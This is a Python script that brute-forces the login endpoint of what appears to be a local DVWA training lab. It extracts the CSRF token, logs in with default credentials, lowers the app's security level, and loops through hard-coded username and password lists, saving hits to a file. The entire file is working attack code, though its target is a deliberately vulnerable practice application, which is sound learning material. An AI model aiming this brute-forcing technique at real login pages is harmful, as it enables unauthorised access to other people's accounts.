#!/usr/bin/env python3
# brute_auto_csrf.py
# Auto-login handling CSRF token, set security to low, then brute-force GET /vulnerabilities/brute/
import requests, re, time, os
from datetime import datetime

BASE = "http://127.0.0.1:8080"
LOGIN_URL = BASE + "/login.php"
SEC_URL = BASE + "/security.php"
BRUTE_URL = BASE + "/vulnerabilities/brute/"
LOGDIR = "logs_csrf"
FOUND_FILE = "found_csrf.txt"
USERS = ["admin","pablo","1337","gordonb","smithy","test"]
PASSES = ["password","123456","admin","letmein","1234","root","test"]
WELCOME_STRS = ["Welcome to the password protected area","Welcome :: Damn Vulnerable Web App"]
USER_IMG_PREFIX = "/hackable/users/"
FAIL_STR = "Username and/or password incorrect"

os.makedirs(LOGDIR, exist_ok=True)

def get_csrf_token(sess):
    r = sess.get(LOGIN_URL, timeout=8)
    # buscar input hidden name="user_token" value="..."
    m = re.search(r'<input[^>]+name=["\']user_token["\'][^>]*value=["\']([^"\']+)["\']', r.text)
    if m:
        return m.group(1)
    # intentar buscar token en metadatos si hay otro nombre
    m2 = re.search(r'name=["\']user_token["\']\s+value=["\']?([^"\'\s>]+)', r.text)
    if m2:
        return m2.group(1)
    return None

def login(sess, user="admin", pwd="password"):
    token = get_csrf_token(sess)
    data = {"username": user, "password": pwd, "Login": "Login"}
    if token:
        data["user_token"] = token
    r = sess.post(LOGIN_URL, data=data, allow_redirects=True, timeout=8)
    return r

def set_security_low(sess):
    # cambiar nivel de seguridad vía la página security.php
    # algunos DVWA requieren pasar seclev=low y submit=Submit
    sess.get(SEC_URL, params={"seclev":"low", "submit":"Submit"}, timeout=8)
    sess.cookies.set("security","low")

def check_success(content, username):
    # heurísticas: welcome text o user image
    for w in WELCOME_STRS:
        if w in content:
            return True, "welcome_text"
    if (USER_IMG_PREFIX + username) in content:
        return True, "user_image"
    return False, "no_indicator"

def try_brute(sess, user, pwd):
    r = sess.get(BRUTE_URL, params={"username":user,"password":pwd,"Login":"Login"}, allow_redirects=True, timeout=8)
    ok, reason = check_success(r.text, user)
    # guardar logs
    safe = f"{user}__{pwd}".replace("/","_").replace(" ","_")
    with open(os.path.join(LOGDIR, f"{safe}.html"), "w", encoding="utf-8", errors="ignore") as fh:
        fh.write(r.text)
    with open(os.path.join(LOGDIR, f"{safe}.hdr"), "w") as hh:
        hh.write(f"HTTP {r.status_code}\n")
        for k,v in r.headers.items():
            hh.write(f"{k}: {v}\n")
    return ok, reason, r.status_code

def main():
    s = requests.Session()
    s.headers.update({"User-Agent":"Mozilla/5.0"})
    print("Login page token check...")
    tok = get_csrf_token(s)
    print("Found token:", bool(tok))
    # try login using admin:password
    print("Attempting login admin:password ...")
    r = login(s, "admin", "password")
    if "Login failed" in r.text or FAIL_STR in r.text or "Username and/or password incorrect" in r.text:
        print("Login como admin:password parece FALLAR. Status:", r.status_code)
    else:
        print("Respuesta tras login (status):", r.status_code)
    # set security low
    set_security_low(s)
    print("Security set to low, cookies:", s.cookies.get_dict())
    # now brute force
    found = []
    start = time.time()
    for u in USERS:
        for p in PASSES:
            ok, reason, status = try_brute(s, u, p)
            if ok:
                print(f"✅ {u}:{p} -> {reason} status={status}")
                found.append((u,p,reason))
            else:
                print(f"❌ {u}:{p}")
            time.sleep(0.02)
    print("Done in", time.time()-start, "s. Found:", len(found))
    if found:
        with open(FOUND_FILE, "w") as fh:
            for u,p,r in found:
                fh.write(f"{u}:{p} # {r}\n")
        print("Saved", FOUND_FILE)
    else:
        print("No credentials verified.")
    print("Logs saved in", LOGDIR)

if __name__ == "__main__":
    main()
